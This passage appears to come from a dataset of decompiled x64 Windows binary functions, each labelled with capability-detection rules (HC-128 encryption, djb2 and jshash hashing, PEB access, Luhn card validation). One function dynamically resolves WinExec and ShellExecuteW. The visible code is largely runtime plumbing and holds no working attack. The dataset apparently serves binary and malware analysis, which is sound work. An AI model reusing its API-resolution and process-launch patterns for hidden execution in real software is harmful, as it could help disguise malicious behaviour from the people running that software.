= ((uVar12 ^ uVar9) & uVar11 ^ uVar12 & uVar9) +\n             ((uVar11 >> 0xd | uVar11 * 0x80000) ^ (uVar11 >> 2 | uVar11 * 0x40000000) ^\n             (uVar11 * 0x400 | uVar11 >> 0x16)) + iVar4;\n    iVar4 = (~uVar16 & uVar14 ^ uVar5 & uVar16) +\n            uVar8 + 0xbef9a3f7 + auStack328[62] +\n            ((uVar16 * 0x80 | uVar16 >> 0x19) ^ (uVar16 >> 6 | uVar16 * 0x4000000) ^ (uVar16 >> 0xb | uVar16 * 0x200000)\n            );\n    uVar12 = uVar12 + iVar4;\n    uVar3 = iVar4 + ((uVar9 ^ uVar11) & uVar10 ^ uVar9 & uVar11) +\n                    ((uVar10 >> 0xd | uVar10 * 0x80000) ^ (uVar10 >> 2 | uVar10 * 0x40000000) ^\n                    (uVar10 * 0x400 | uVar10 >> 0x16));\n    iVar4 = (~uVar12 & uVar5 ^ uVar16 & uVar12) +\n            uVar14 + 0xc67178f2 + auStack328[63] +\n            ((uVar12 * 0x80 | uVar12 >> 0x19) ^ (uVar12 >> 6 | uVar12 * 0x4000000) ^ (uVar12 >> 0xb | uVar12 * 0x200000)\n            );\n    arg1[3] = uVar11 + arg1[3];\n    arg1[2] = uVar10 + arg1[2];\n    arg1[1] = uVar3 + arg1[1];\n    *arg1 = ((uVar3 >> 0xd | uVar3 * 0x80000) ^ (uVar3 >> 2 | uVar3 * 0x40000000) ^ (uVar3 * 0x400 | uVar3 >> 0x16)) +\n            ((uVar11 ^ uVar10) & uVar3 ^ uVar11 & uVar10) + uVar2 + iVar4;\n    arg1[4] = iVar4 + uVar9 + uVar1;\n    arg1[5] = uVar12 + arg1[5];\n    arg1[6] = uVar16 + arg1[6];\n    arg1[7] = uVar5 + arg1[7];\n    return;\n}\n",
        "token_count": 14925
    },
    "14000617": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nint64_t fcn.140006170(int64_t arg1, int64_t arg2)\n\n{\n    int16_t *piVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint8_t uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    \n    iVar7 = fcn.140006146(0x1400edec0, (arg2 + 1) * 2);\n    iVar10 = 0;\n    iVar9 = 0;\n    do {\n        iVar6 = iVar9 * 2;\n        piVar1 = iVar7 + iVar6;\n        if (arg2 <= iVar10) {\n            *piVar1 = 0;\n            return iVar7;\n        }\n        uVar5 = *(arg1 + iVar10);\n        if (uVar5 < '\\0') {\n            if (uVar5 >> 5 == 6) {\n                if (arg2 + -1 <= iVar10) goto code_r0x000140006254;\n                puVar2 = arg1 + 1 + iVar10;\n                iVar10 = iVar10 + 2;\n                uVar8 = (uVar5 & 0x1f) << 6 | *puVar2 & 0x3f;\n                goto code_r0x0001400062ed;\n            }\n            if (uVar5 >> 4 == 0xe) {\n                if (arg2 + -2 <= iVar10) {\ncode_r0x000140006254:\n                    iVar10 = iVar10 + 1;\n                    uVar8 = 0xfffd;\n                    goto code_r0x0001400062ed;\n                }\n                puVar2 = arg1 + 2 + iVar10;\n                puVar3 = arg1 + 1 + iVar10;\n                iVar10 = iVar10 + 3;\n                uVar8 = *puVar2 & 0x3f | (uVar5 & 0xf) << 0xc | (*puVar3 & 0x3f) << 6;\ncode_r0x0001400062dd:\n                if ((uVar8 < 0xd800) || (0xdfff < uVar8)) goto code_r0x0001400062ed;\ncode_r0x0001400062f3:\n                *piVar1 = -3;\n            }\n            else {\n                if ((uVar5 >> 3 != 0x1e) || (arg2 + -3 <= iVar10)) goto code_r0x000140006254;\n                puVar2 = arg1 + 3 + iVar10;\n                puVar3 = arg1 + 1 + iVar10;\n                puVar4 = arg1 + 2 + iVar10;\n                iVar10 = iVar10 + 4;\n                uVar8 = *puVar2 & 0x3f | (uVar5 & 7) << 0x12 | (*puVar3 & 0x3f) << 0xc | (*puVar4 & 0x3f) << 6;\n                if (uVar8 < 0x10000) goto code_r0x0001400062dd;\n                if (0x10ffff < uVar8) goto code_r0x0001400062f3;\n                iVar9 = iVar9 + 1;\n                *piVar1 = (uVar8 - 0x10000 >> 10) + -0x2800;\n                *(iVar7 + 2 + iVar6) = (uVar8 - 0x10000 & 0x3ff) + 0xdc00;\n            }\n        }\n        else {\n            uVar8 = uVar5;\n            iVar10 = iVar10 + 1;\ncode_r0x0001400062ed:\n            *piVar1 = uVar8;\n        }\n        iVar9 = iVar9 + 1;\n    } while( true );\n}\n",
        "token_count": 883
    },
    "14000277": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nvoid fcn.140002774(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t *puVar1;\n    int64_t iVar2;\n    int64_t iStack24;\n    int64_t iStack16;\n    \n    fcn.14000272a(&iStack24, *(arg2 + 8));\n    *(arg2 + 0x18) = 0;\n    iVar2 = *(arg1 + 8 + (iStack24 * 0x20 + 0x10e + iStack16) * 8);\n    *(arg2 + 0x10) = iVar2;\n    if (iVar2 != 0) {\n        *(iVar2 + 0x18) = arg2;\n    }\n    *(arg1 + 8 + (iStack24 * 0x20 + 0x10e + iStack16) * 8) = arg2;\n    puVar1 = arg1 + 0x814 + iStack24 * 4;\n    *puVar1 = *puVar1 | 1 << (iStack16 & 0x1f);\n    *(arg1 + 0x810) = *(arg1 + 0x810) | 1 << (iStack24 & 0x1f);\n    return;\n}\n",
        "token_count": 283
    },
    "14000281": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nulong * fcn.14000281c(int64_t arg1, uint64_t arg2)\n\n{\n    uint32_t *puVar1;\n    int64_t iVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    ulong *arg2_00;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    \n    cVar3 = fcn.14000158a(arg2 & 0xffffffff);\n    uVar5 = (1 << (cVar3 - 5U & 0x3f)) + 0xfffU & 0xfffffffffffff000;\n    uVar9 = (uVar5 - 1) + arg2 & -uVar5;\n    uVar5 = 0x3f000000;\n    if (uVar9 < 0x3f000001) {\n        uVar5 = uVar9;\n    }\n    iVar6 = fcn.14000158a(uVar5 & 0xffffffff);\n    iVar7 = iVar6 + -6;\n    uVar8 = 0xffffffff << ((uVar5 >> (iVar6 - 5U & 0x3f)) - 0x20U & 0x3f) & *(arg1 + 0x7fc + iVar6 * 4);\n    if (uVar8 == 0) {\n        uVar8 = 0xffffffff << (iVar7 + 1U & 0x3f) & *(arg1 + 0x810);\n        iVar7 = fcn.14000158a(-uVar8 & uVar8);\n        if (0 < iVar7) {\n            uVar4 = *(arg1 + 0x814 + iVar7 * 4);\n            uVar8 = -uVar4;\n            goto code_r0x0001400028ca;\n        }\ncode_r0x000140002964:\n        if (uVar9 < 0x80000) {\n            arg2_00 = fcn.1400023c2(arg1, 0x80000);\n        }\n        else {\n            arg2_00 = fcn.1400023c2(arg1, uVar5);\n            if (arg2_00[1] == uVar5 || arg2_00[1] < uVar5) goto code_r0x0001400029a1;\n        }\n    }\n    else {\n        uVar4 = -uVar8;\ncode_r0x0001400028ca:\n        iVar6 = fcn.14000158a(uVar8 & uVar4);\n        arg2_00 = *(arg1 + 8 + (iVar6 + 0x10e + iVar7 * 0x20) * 8);\n        if (arg2_00 == NULL) goto code_r0x000140002964;\n        iVar2 = arg2_00[2];\n        *(arg1 + 8 + (iVar6 + 0x10e + iVar7 * 0x20) * 8) = iVar2;\n        if (iVar2 == 0) {\n            puVar1 = arg1 + 0x814 + iVar7 * 4;\n            *puVar1 = *puVar1 & ~(1 << (iVar6 & 0x1f));\n            if (*puVar1 == 0) {\n                *(arg1 + 0x810) = *(arg1 + 0x810) & ~(1 << (iVar7 & 0x1f));\n            }\n        }\n        else {\n            *(iVar2 + 0x18) = 0;\n        }\n        arg2_00[3] = 0;\n        arg2_00[2] = 0;\n        if (arg2_00[1] <= uVar5 + 0xfff) goto code_r0x0001400029a1;\n    }\n    fcn.1400027fd(arg1, arg2_00, uVar5);\ncode_r0x0001400029a1:\n    *arg2_00 = 1;\n    fcn.14000263c(arg1, arg2_00 >> 0xc);\n    *(arg1 + 0x2090) = *(arg1 + 0x2090) - uVar5;\n    return arg2_00;\n}\n",
        "token_count": 952
    },
    "140002b5": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nvoid fcn.140002b55(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t *puVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t iStack24;\n    int64_t iStack16;\n    \n    fcn.14000272a(&iStack24, *(arg2 + 8));\n    iVar2 = *(arg2 + 0x10);\n    if (iVar2 != 0) {\n        *(iVar2 + 0x18) = *(arg2 + 0x18);\n    }\n    if (*(arg2 + 0x18) != 0) {\n        *(*(arg2 + 0x18) + 0x10) = iVar2;\n    }\n    iVar2 = iStack24 * 0x20 + 0x10e + iStack16;\n    if ((*(arg1 + 8 + iVar2 * 8) == arg2) && (iVar3 = *(arg2 + 0x10),  *(arg1 + 8 + iVar2 * 8) = iVar3,  iVar3 == 0)) {\n        puVar1 = arg1 + 0x814 + iStack24 * 4;\n        *puVar1 = *puVar1 & ~(1 << (iStack16 & 0x1f));\n        if (*puVar1 == 0) {\n            *(arg1 + 0x810) = *(arg1 + 0x810) & ~(1 << (iStack24 & 0x1f));\n        }\n    }\n    *(arg2 + 0x18) = 0;\n    *(arg2 + 0x10) = 0;\n    return;\n}\n",
        "token_count": 376
    },
    "140018bf": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.140018bf0(int64_t arg1, ulong arg2)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    int8_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t *puVar7;\n    uint32_t *puVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    uint32_t *puVar11;\n    \n    iVar9 = *(arg1 + 0x14);\n    if (arg2 >> 5 < *(arg1 + 0x14)) {\n        puVar1 = arg1 + 0x18;\n        iVar10 = arg2 >> 5;\n        puVar2 = puVar1 + iVar9;\n        puVar7 = puVar1 + iVar10;\n        if ((arg2 & 0x1f) == 0) {\n            puVar11 = puVar1;\n            if (puVar2 <= puVar7) goto code_r0x000140018c88;\n            do {\n                puVar8 = puVar7 + 1;\n                *puVar11 = *puVar7;\n                puVar7 = puVar8;\n                puVar11 = puVar11 + 1;\n            } while (puVar8 < puVar2);\n            puVar7 = puVar1 + (iVar9 - iVar10);\n        }\n        else {\n            uVar3 = *puVar7;\n            puVar7 = puVar7 + 1;\n            iVar4 = arg2 & 0x1f;\n            uVar5 = uVar3 >> iVar4;\n            puVar11 = puVar1;\n            if (puVar7 < puVar2) {\n                do {\n                    puVar8 = puVar7 + 1;\n                    *puVar11 = *puVar7 << (0x20U - iVar4 & 0x1f) | uVar5;\n                    uVar3 = *puVar7;\n                    uVar5 = uVar3 >> iVar4;\n                    puVar7 = puVar8;\n                    puVar11 = puVar11 + 1;\n                } while (puVar8 < puVar2);\n                puVar7 = arg1 + 0x14 + (iVar9 - iVar10) * 4;\n                *puVar7 = uVar5;\n                if (uVar3 >> iVar4 == 0) goto code_r0x000140018cbd;\n            }\n            else {\n                *(arg1 + 0x18) = uVar5;\n                puVar7 = puVar1;\n                if (uVar3 >> iVar4 == 0) goto code_r0x000140018c88;\n            }\n            puVar7 = puVar7 + 1;\n        }\ncode_r0x000140018cbd:\n        iVar6 = puVar7 - puVar1 >> 2;\n        *(arg1 + 0x14) = iVar6;\n        if (iVar6 != 0) {\n            return;\n        }\n    }\n    else {\ncode_r0x000140018c88:\n        *(arg1 + 0x14) = 0;\n    }\n    *(arg1 + 0x18) = 0;\n    return;\n}\n",
        "token_count": 714
    },
    "140002ea": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid fcn.140002ea9(ulong arg1, int64_t arg2)\n\n{\n    char cVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    uint64_t uVar8;\n    char acStack306 [250];\n    \n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    if (iVar4 == 0) {\n        iVar4 = 1;\n        fcn.140002078(acStack306, 0xfa);\n        acStack306[0] = '_';\n        do {\n            cVar1 = *(arg2 + -1 + iVar4);\n            if (cVar1 == '\\0') break;\n            acStack306[iVar4] = cVar1;\n            iVar4 = iVar4 + 1;\n        } while (iVar4 != 0xf5);\n        acStack306[iVar4] = '@';\n        uVar8 = 99;\n        do {\n            uVar5 = uVar8 - 99;\n            if (uVar8 < 199) {\n                if (uVar8 - 0x5a < 0x13) {\n                    iVar4 = iVar4 + 1;\n                }\n                else {\n                    iVar4 = iVar4 + 2;\n                }\n            }\n            else {\n                iVar4 = iVar4 + 3;\n            }\n            acStack306[iVar4 + 1] = '\\0';\n            do {\n                acStack306[iVar4] = SUB161(ZEXT816(uVar5) % ZEXT816(10), 0) + '0';\n                iVar4 = iVar4 + -1;\n                uVar5 = uVar5 / 10;\n            } while (uVar5 != 0);\n            iVar6 = (*pcVar3)(arg1);\n            pcVar2 = *0x14001b130;\n            if (iVar6 != 0) {\n                return;\n            }\n            uVar8 = uVar8 + 4;\n        } while (uVar8 != 0x12f);\n        uVar7 = (**0x14001b130)(2);\n        fcn.140001f42(uVar7, \"could not import: \");\n        uVar7 = (*pcVar2)(2);\n        fcn.140001f42(uVar7, arg2);\n        uVar7 = (*pcVar2)(2);\n        fcn.140001f42(uVar7, 0x14001c0de);\n        sub.msvcrt.dll_exit(1);\n    }\n    return;\n}\n",
        "token_count": 585
    },
    "14000645": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000645e(int64_t **arg1, uint64_t arg2)\n\n{\n    char cVar1;\n    int64_t *piVar2;\n    ulong uVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    char *pcVar7;\n    char *pcVar8;\n    char acStack65 [33];\n    \n    if (arg2 < 0) {\n        if (arg2 != 0x8000000000000000) {\n            arg2 = -arg2;\n        }\n        piVar2 = *arg1;\n        iVar6 = 0;\n        if (piVar2 != NULL) {\n            iVar6 = *piVar2;\n        }\n        uVar3 = fcn.1400063ae(piVar2, iVar6 + 1);\n        fcn.140004ef3(arg1, uVar3);\n        *(*arg1 + iVar6 + 0x10) = 0x2d;\n    }\n    iVar6 = 0x17;\n    for (; 99 < arg2; arg2 = arg2 / 100) {\n        iVar5 = (arg2 % 100) * 2;\n        cVar1 = \"00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\"\n                [iVar5];\n        acStack65[iVar6 + 1] =\n             \"00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\"\n             [iVar5 + 1];\n        acStack65[iVar6] = cVar1;\n        iVar6 = iVar6 + -2;\n    }\n    if (arg2 < 10) {\n        acStack65[iVar6 + 1] = arg2 + '0';\n    }\n    else {\n        cVar1 = \"00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\"\n                [arg2 * 2];\n        acStack65[iVar6 + 1] =\n             \"00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\"\n             [arg2 * 2 + 1];\n        acStack65[iVar6] = cVar1;\n        iVar6 = iVar6 + -1;\n    }\n    iVar5 = 0;\n    piVar2 = *arg1;\n    if (piVar2 != NULL) {\n        iVar5 = *piVar2;\n    }\n    uVar3 = fcn.1400063ae(piVar2, (0x18U - iVar6) + iVar5);\n    fcn.140004ef3(arg1, uVar3);\n    pcVar7 = acStack65 + iVar6 + 1;\n    pcVar8 = *arg1 + iVar5 + 0x10;\n    for (uVar4 = 0x18U - iVar6 & 0xffffffff; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *pcVar8 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n        pcVar8 = pcVar8 + 1;\n    }\n    return;\n}\n",
        "token_count": 880
    },
    "14001a2d": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nulong fcn.14001a2d0(void)\n\n{\n    int64_t iVar1;\n    code *pcStack64;\n    code *pcStack56;\n    uchar *puStack48;\n    \n    puStack48 = 0x14001a2d9;\n    fcn.140009fa0();\n    *0x1400dc040 = 2;\n    *0x1400dc450 = 0x1400dc320;\n    *0x1400dc050 = 0x331;\n    *0x1400eded0 = 0x16;\n    *0x1400dc048 = 2;\n    *0x1400edec0 = 8;\n    pcStack56 = 0x140002fe1;\n    *0x1400dc058 = 0x1400dc140;\n    *0x1400eded8 = 0x1400dc040;\n    *0x1400edef0 = 0x140001540;\n    *0x1400dcf40 = 0x1400dc3e0;\n    *0x1400dc360 = 0x1400dc440;\n    *0x1400dc458 = \"parent\";\n    *0x1400dc368 = 0x1400dc470;\n    *0x1400edec8 = 8;\n    *0x1400dcf38 = 0;\n    *0x1400dcf20 = 8;\n    *0x1400dcf28 = 8;\n    *0x1400dcf30 = 0x111;\n    *0x1400dc400 = 0;\n    *0x1400dc3e0 = 2;\n    *0x1400dc3a0 = 0x30;\n    *0x1400dc3a8 = 8;\n    *0x1400dc3b0 = 0x11;\n    *0x1400dc3b8 = 0x1400dcf20;\n    *0x1400dc440 = 1;\n    *0x1400dc448 = 8;\n    *0x1400dc2f8 = 0;\n    *0x1400dc2e0 = 8;\n    *0x1400dc2e8 = 8;\n    *0x1400dc2f0 = 0x31d;\n    *0x1400dc470 = 1;\n    *0x1400dc478 = 0x10;\n    *0x1400dc370 = 0x1400dc4a0;\n    *0x1400dc4b8 = 0x14001c31e;\n    *0x1400dc378 = 0x1400dc4d0;\n    *0x1400dc280 = 0x1400dc530;\n    *0x1400dc548 = \"procname\";\n    *0x1400dc288 = 0x1400dc560;\n    *0x1400dc570 = 0x1400dc240;\n    *0x1400dc578 = \"line\";\n    *0x1400dc480 = 0x1400dc2e0;\n    *0x1400dc540 = 0x1400dc2e0;\n    *0x1400dc290 = 0x1400dc590;\n    *0x1400dc488 = \"name\";\n    *0x1400dcaf8 = 0;\n    *0x1400dcae0 = 8;\n    *0x1400dcae8 = 8;\n    *0x1400dcaf0 = 0x21c;\n    *0x1400dc4a0 = 1;\n    *0x1400dc4a8 = 0x18;\n    *0x1400dc4b0 = 0x1400dcae0;\n    *0x1400dc2b8 = 0;\n    *0x1400dc2a0 = 0x18;\n    *0x1400dc2a8 = 8;\n    *0x1400dc2b0 = 0x112;\n    *0x1400dc530 = 1;\n    *0x1400dc538 = 0;\n    *0x1400dc258 = 0;\n    *0x1400dc240 = 8;\n    *0x1400dc248 = 8;\n    *0x1400dc250 = 799;\n    *0x1400dc560 = 1;\n    *0x1400dc568 = 8;\n    *0x1400dc590 = 1;\n    *0x1400dc598 = 0x10;\n    *0x1400dc5a0 = 0x1400dc2e0;\n    *0x1400dc5a8 = \"filename\";\n    *0x1400dc528 = 0x1400dc280;\n    *0x1400dc2c0 = 0x1400dc500;\n    *0x1400e4438 = 0x1400dc2a0;\n    *0x1400e4450 = 0x140001654;\n    *0x1400dc4e0 = 0x1400e4420;\n    *0x1400dc4e8 = \"trace\";\n    *0x1400dc380 = 0x1400dc5c0;\n    *0x1400dc5d8 = 0x14001c33f;\n    *0x1400dc438 = 0x1400dc360;\n    *0x1400dc3c0 = 0x1400dc410;\n    *0x1400dc350 = 0x1400055b9;\n    *0x1400dc5d0 = 0x1400dc320;\n    *0x1400dc338 = 0x1400dc3a0;\n    *0x1400dc520 = 3;\n    *0x1400dc500 = 2;\n    *0x1400e4420 = 8;\n    *0x1400e4428 = 8;\n    *0x1400e4430 = 0x18;\n    *0x1400dc4d0 = 1;\n    *0x1400dc4d8 = 0x20;\n    *0x1400dc5c0 = 1;\n    *0x1400dc5c8 = 0x28;\n    *0x1400dc430 = 5;\n    *0x1400dc410 = 2;\n    *0x1400dc320 = 8;\n    *0x1400dc328 = 8;\n    *0x1400dc330 = 0x16;\n    *0x1400dc200 = 0x30;\n    *0x1400dc208 = 8;\n    *0x1400dc210 = 0x11;\n    *0x1400dc218 = 0x1400dc3a0;\n    *0x1400dc220 = 0x1400dc5f0;\n    *0x1400e43c0 = 0x1400dc620;\n    *0x1400e43f8 = 0x1400e43a0;\n    *0x1400e4410 = 0x14000560c;\n    *0x1400dc1e0 = 0x1400dc650;\n    *0x1400e4478 = 0x1400dc1c0;\n    *0x1400e4480 = 0x1400dc680;\n    *0x1400e43b8 = 0x1400dc200;\n    *0x1400dc1d8 = 0x1400dc200;\n    *0x1400dc610 = 0;\n    *0x1400dc5f0 = 2;\n    *0x1400e43a0 = 0x30;\n    *0x1400e43a8 = 8;\n    *0x1400e43b0 = 0x11;\n    *0x1400dc640 = 0;\n    *0x1400dc620 = 2;\n    *0x1400e43e0 = 8;\n    *0x1400e43e8 = 8;\n    *0x1400e43f0 = 0x16;\n    *0x1400dc1c0 = 0x30;\n    *0x1400dc1c8 = 8;\n    *0x1400dc1d0 = 0x11;\n    *0x1400dc670 = 0;\n    *0x1400dc650 = 2;\n    *0x1400e4460 = 0x30;\n    *0x1400e4468 = 8;\n    *0x1400e4470 = 0x11;\n    *0x1400dc6a0 = 0;\n    *0x1400dc680 = 2;\n    *0x1400e44a0 = 8;\n    *0x1400e44a8 = 8;\n    *0x1400e44b0 = 0x16;\n    *0x1400e44b8 = 0x1400e4460;\n    *0x1400dc198 = 0x1400dc3a0;\n    *0x1400e44d0 = 0x140005651;\n    *0x1400dc1a0 = 0x1400dc6b0;\n    *0x1400dd5c0 = 0x1400dc6e0;\n    *0x1400dd038 = 0x1400dc200;\n    *0x1400dd5b8 = 0x1400dc180;\n    *0x1400dd610 = 0x140005696;\n    *0x1400dcc58 = 0;\n    *0x1400dcc40 = 4;\n    *0x1400dcc48 = 4;\n    *0x1400dcc50 = 0x32b;\n    *0x1400dcfb8 = 0;\n    *0x1400dcfa0 = 1;\n    *0x1400dcfa8 = 1;\n    *0x1400dcfb0 = 0x329;\n    *0x1400dc180 = 0x30;\n    *0x1400dc188 = 8;\n    *0x1400dc190 = 0x11;\n    *0x1400dc6d0 = 0;\n    *0x1400dc6b0 = 2;\n    *0x1400dd5a0 = 0x30;\n    *0x1400dd5a8 = 8;\n    *0x1400dd5b0 = 0x11;\n    *0x1400dc700 = 0;\n    *0x1400dc6e0 = 2;\n    *0x1400dd5e0 = 8;\n    *0x1400dd5e8 = 8;\n    *0x1400dd5f0 = 0x16;\n    *0x1400dd5f8 = 0x1400dd5a0;\n    *0x1400dd020 = 0x30;\n    *0x1400dd028 = 8;\n    *0x1400dd030 = 0x11;\n    *0x1400dc730 = 0;\n    *0x1400dd040 = 0x1400dc710;\n    *0x1400dd078 = 0x1400dd020;\n    *0x1400dd090 = 0x1400056db;\n    *0x1400eb280 = 0x1400dc740;\n    *0x1400eb278 = 0x1400dc180;\n    *0x1400eb2b8 = 0x1400eb260;\n    *0x1400dc118 = 0x1400dc180;\n    *0x1400eb2d0 = 0x140005720;\n    *0x1400dc710 = 2;\n    *0x1400dd060 = 8;\n    *0x1400dd068 = 8;\n    *0x1400dd070 = 0x16;\n    *0x1400dc158 = 0;\n    *0x1400dc140 = 2;\n    *0x1400dc148 = 2;\n    *0x1400dc150 = 0x321;\n    *0x1400eb260 = 0x30;\n    *0x1400eb268 = 8;\n    *0x1400eb270 = 0x11;\n    *0x1400dc760 = 0;\n    *0x1400dc740 = 2;\n    *0x1400eb2a0 = 8;\n    *0x1400eb2a8 = 8;\n    *0x1400eb2b0 = 0x16;\n    *0x1400dc100 = 0x38;\n    *0x1400dc108 = 8;\n    *0x1400dc110 = 0x11;\n    *0x1400dc0d8 = 0;\n    *0x1400dc0c0 = 4;\n    *0x1400dc0c8 = 4;\n    *0x1400dc0d0 = 0x322;\n    *0x1400dc770 = 1;\n    *0x1400dc778 = 0x30;\n    *0x1400dc780 = 0x1400dc0c0;\n    *0x1400dc788 = \"errorCode\";\n    *0x1400dc120 = 0x1400dc770;\n    *0x1400dc098 = 0x1400dc100;\n    *0x1400dc0b0 = 0x140005765;\n    *0x1400dc080 = 8;\n    *0x1400dc088 = 8;\n    *0x1400dc090 = 0x16;\n    fcn.14000156a(&stack0xffffffffffffffc8);\n    fcn.140001fac(0x1400055fe);\n    puStack48 = &stack0xffffffffffffffd0;\n    fcn.14000156a(puStack48);\n    *0x1400eb2e8 = 0x400000;\n    *0x1400eb2f0 = 500;\n    *0x1400ede38 = 0;\n    *0x1400ede40 = 0;\n    *0x1400ede48 = 0;\n    *0x1400ede50 = 0;\n    *0x1400ede58 = 0;\n    *0x1400ede60 = 0;\n    *0x1400eb2f8 = 0;\n    *0x1400eb300 = 0x400;\n    *0x1400eb308 = fcn.140002d30(0x2000);\n    *0x1400eb328 = 0;\n    *0x1400eb330 = 0x400;\n    *0x1400eb338 = fcn.140002d30(0x2000);\n    *0x1400eb310 = 0;\n    *0x1400eb318 = 0x400;\n    *0x1400eb320 = fcn.140002d30(0x2000);\n    *0x1400ede88 = fcn.140002d30(0x2000);\n    *0x1400ede78 = 0x3ff;\n    *0x1400ede70 = 0;\n    *0x1400ede80 = 0;\n    *0x1400ede90 = 0;\n    *0x1400ede98 = 0x400;\n    *0x1400edea0 = fcn.140002d30(0x2000);\n    *0x1400edea8 = *0x1400dc7a0;\n    *0x1400dc7a0 = *0x1400dc7a0 + 1;\n    sub.msvcrt.dll_signal(2, 0x140007121);\n    sub.msvcrt.dll_signal(0xb, 0x140007121);\n    sub.msvcrt.dll_signal(0x16, 0x140007121);\n    sub.msvcrt.dll_signal(8, 0x140007121);\n    sub.msvcrt.dll_signal(4, 0x140007121);\n    *0x1400dc7a8 = fcn.140002d6a(0x14001d8e0);\n    if (*0x1400dc7a8 == 0) {\n        iVar1 = 0x14001d8c0;\n    }\n    else {\n        *0x1400dd0a8 = fcn.140002ea9(*0x1400dc7a8, \"WinExec\");\n        iVar1 = fcn.140002d6a(0x14001d920);\n        *0x1400dc7b0 = iVar1;\n        if (iVar1 != 0) goto code_r0x000140009801;\n        iVar1 = 0x14001d900;\n    }\n    while( true ) {\n        while( true ) {\n            while( true ) {\n                fcn.140002d81(iVar1);\ncode_r0x000140009801:\n                *0x1400dd0a0 = fcn.140002ea9(iVar1, \"ShellExecuteW\");\n                *0x1400dc7b8 = fcn.140002d6a(0x14001d960);\n                if (*0x1400dc7b8 != 0) break;\n                iVar1 = 0x14001d940;\n            }\n            *0x1400dd580 = fcn.140002ea9(*0x1400dc7b8, \"MultiByteToWideChar\");\n            *0x1400dc7d8 = fcn.140002d6a(0x14001d9a0);\n            if (*0x1400dc7d8 != 0) break;\n            iVar1 = 0x14001d980;\n        }\n        *0x1400dc7d0 = fcn.140002ea9(*0x1400dc7d8, \"FormatMessageW\");\n        *0x1400dc7c8 = fcn.140002ea9(*0x1400dc7d8, \"LocalFree\");\n        *0x1400dc7c0 = fcn.140002ea9(*0x1400dc7d8, \"GetLastError\");\n        *0x1400dcaa0 = 0x28;\n        *0x1400dc8a0 = 0x1400dc990;\n        *0x1400dc9a0 = 0x1400dc860;\n        *0x1400dc9a8 = \"Field0\";\n        *0x1400dc8a8 = 0x1400dc9c0;\n        *0x1400dc840 = 0x1400dc9f0;\n        *0x1400dc7f8 = 0x1400dc820;\n        *0x1400dc810 = 0x14000180a;\n        *0x1400dca80 = 0x1400dc930;\n        *0x1400dcaa8 = 8;\n        *0x1400dcab0 = 0x12;\n        *0x1400dcab8 = 0;\n        *0x1400dc8c0 = 0x10;\n        *0x1400dc8c8 = 8;\n        *0x1400dc8d0 = 0x12;\n        *0x1400dc8d8 = 0;\n        *0x1400dc878 = 0;\n        *0x1400dc860 = 8;\n        *0x1400dc868 = 8;\n        *0x1400dc870 = 0x31a;\n        *0x1400dc990 = 1;\n        *0x1400dc998 = 0;\n        *0x1400dc838 = 0x1400dcf20;\n        *0x1400dc820 = 8;\n        *0x1400dc828 = 8;\n        *0x1400dc830 = 0x111;\n        *0x1400dca10 = 0;\n        